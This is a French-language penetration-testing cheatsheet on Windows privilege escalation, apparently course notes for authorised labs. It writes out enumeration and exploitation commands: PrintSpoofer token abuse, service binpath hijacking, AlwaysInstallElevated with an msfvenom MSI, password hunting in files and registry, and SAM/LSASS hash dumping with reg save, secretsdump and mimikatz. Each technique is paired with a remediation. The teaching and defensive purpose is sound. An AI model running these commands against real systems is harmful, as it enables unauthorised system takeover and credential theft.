# Cheatsheet — Élévation de privilèges Windows

Passer d'un compte utilisateur à `NT AUTHORITY\SYSTEM` (ou administrateur local). Même méthode qu'en Linux : **énumérer d'abord, exploiter ensuite**, checklist figée.

> ⚠️ **Cadre.** Labs et périmètres autorisés uniquement. Justifier chaque piste et donner le correctif (rapport).

---

## 1. Énumération automatisée

```powershell
# winPEAS (exe ou bat)
winPEASx64.exe
# PowerUp (recherche de mauvaises configs exploitables)
powershell -ep bypass
Import-Module .\PowerUp.ps1 ; Invoke-AllChecks
# Seatbelt (collecte de renseignements)
Seatbelt.exe -group=all
```

---

## 2. Premiers réflexes manuels

```cmd
whoami /all                 :: groupes ET surtout PRIVILÈGES du jeton
systeminfo                  :: version, correctifs (KB) installés
hostname
net user                    :: comptes locaux
net localgroup administrators
ipconfig /all ; route print ; netstat -ano
```

---

## 3. La checklist — piste par piste

### Privilèges du jeton (`whoami /priv`) — le plus rentable
Certains privilèges = SYSTEM presque garanti.
| Privilège | Exploitation |
| --- | --- |
| **SeImpersonate / SeAssignPrimaryToken** | Familles **Potato** (JuicyPotato, PrintSpoofer, GodPotato) → SYSTEM. Fréquent sur comptes de service, IIS, MSSQL |
| **SeBackup / SeRestore** | Lire tout fichier (SAM, SYSTEM) → dump des hashes |
| **SeDebug** | S'attacher à un process privilégié |
| **SeTakeOwnership** | S'approprier un objet/fichier |
```cmd
whoami /priv
PrintSpoofer.exe -i -c cmd            :: si SeImpersonate
```
> **Correctif** : limiter ces privilèges aux comptes qui les justifient ; isoler les comptes de service (gMSA).

### Services mal configurés
```cmd
:: Chemin non entre guillemets avec espace (unquoted service path)
wmic service get name,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\Windows"
:: → déposer un exe au bon endroit sur le chemin coupé par l'espace

:: Droits faibles sur le binaire ou le service (on peut le remplacer/reconfigurer)
accesschk.exe -uwcqv "Users" *          :: (Sysinternals)
sc qc <service> ; sc config <service> binpath= "C:\...\eleve.exe"
```
PowerUp automatise : `Get-ServiceUnquoted`, `Get-ModifiableServiceFile`, `Get-ModifiableService`.
> **Correctif** : guillemets sur les chemins, droits stricts sur binaires et services.

### AlwaysInstallElevated
Installe un MSI en SYSTEM si deux clés de registre sont à 1.
```cmd
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
:: les deux = 1 → msfvenom -f msi → msiexec /quiet /qn /i evil.msi
```
> **Correctif** : ne jamais activer cette stratégie.

### Identifiants stockés
```cmd
:: Fichiers de conf et d'install
findstr /si password *.xml *.ini *.txt *.config 2>nul
:: unattend.xml / sysprep (installation automatisée)
type C:\Windows\Panther\Unattend.xml
:: Identifiants Windows enregistrés
cmdkey /list ; runas /savecred /user:admin cmd
:: Registre (autologon, PuTTY, VNC)
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```
> **Correctif** : purger les secrets des fichiers/registre, LAPS pour l'admin local.

### DLL hijacking
Un programme charge une DLL par nom, trouvable dans un dossier modifiable de son PATH.
```
Repérer une DLL absente chargée depuis un chemin écrivable (Procmon) → y déposer sa DLL.
```
> **Correctif** : chemins de recherche sûrs, dossiers d'appli non modifiables par les utilisateurs.

### Tâches planifiées
```cmd
schtasks /query /fo LIST /v | findstr /i "Task To Run"
:: Action pointant un script/exe modifiable et lancé en compte privilégié
```
> **Correctif** : droits stricts sur les cibles des tâches.

### Correctifs manquants (noyau / exploits)
```cmd
systeminfo                              :: liste des KB
:: Comparer avec Windows Exploit Suggester (WES-NG) / Watson
wes.py systeminfo.txt
```
> Ex. classiques en lab : PrintNightmare, HiveNightmare/SeriousSAM. **Correctif** : patcher.

### Fichiers SAM/SYSTEM lisibles (HiveNightmare)
```cmd
:: copies shadow accessibles → dump hashes hors ligne (secretsdump)
```

---

## 4. Après SYSTEM : moisson

```cmd
:: Dump des hashes locaux
reg save HKLM\SAM sam.save & reg save HKLM\SYSTEM system.save
:: hors ligne : impacket-secretsdump -sam sam.save -system system.save LOCAL
:: mimikatz : sekurlsa::logonpasswords (mémoire LSASS)
```
→ hashes NTLM vers **hashcat -m 1000**, ou Pass-the-Hash latéral (voir smb.md / ad-attacks.md).

---

## 5. Résumé express (ordre à dérouler)

```
1. whoami /priv        (SeImpersonate → Potato)
2. services            (unquoted, droits faibles)
3. AlwaysInstallElevated
4. identifiants stockés (fichiers, registre, cmdkey)
5. tâches planifiées
6. DLL hijacking
7. correctifs manquants (WES-NG)
8. SAM/SYSTEM lisibles
```

---

## 6. Côté défense

Restreindre SeImpersonate, guillemets + droits stricts sur les services, jamais d'AlwaysInstallElevated, LAPS (admin local unique), purge des secrets en clair, application des correctifs, moindre privilège.

---

## 7. À savoir expliquer à l'oral (module 6)

- **Pourquoi `whoami /priv` en premier** : SeImpersonate sur un compte de service = SYSTEM quasi assuré (Potato).
- **Unquoted service path** : le mécanisme exact (l'espace coupe le chemin) et son correctif (guillemets).
- **Le lien avec la suite** : SYSTEM → dump SAM/LSASS → hashcat / Pass-the-Hash → mouvement latéral.
- Pour chaque piste : la **justifier** et donner le **correctif**.

**Labs** : TryHackMe « Windows PrivEsc », machines HTB Windows Easy/Medium.
